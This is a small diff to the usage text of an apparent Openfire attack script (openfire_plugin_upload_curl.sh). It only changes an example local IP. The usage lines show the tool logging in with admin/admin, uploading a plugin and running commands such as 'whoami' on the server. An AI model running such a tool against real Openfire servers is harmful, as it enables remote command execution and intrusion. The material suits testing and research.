@@ -125,7 +125,7 @@ OR
 
 \e[31m[!]\e[0m Usage Example:
 
-bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target http://127.0.0.1:9090 -debug -local_ip 10.10.16.23 -local_port 8081 -get_log -windows -command 'whoami' -proxy http://127.0.0.1:8080
+bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target http://127.0.0.1:9090 -debug -local_ip 10.10.10.10 -local_port 8081 -get_log -windows -command 'whoami' -proxy http://127.0.0.1:8080
 
 bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target https://127.0.0.1:9091 -linux -command 'ping -c 4 10.10.10.10' -ssl
 
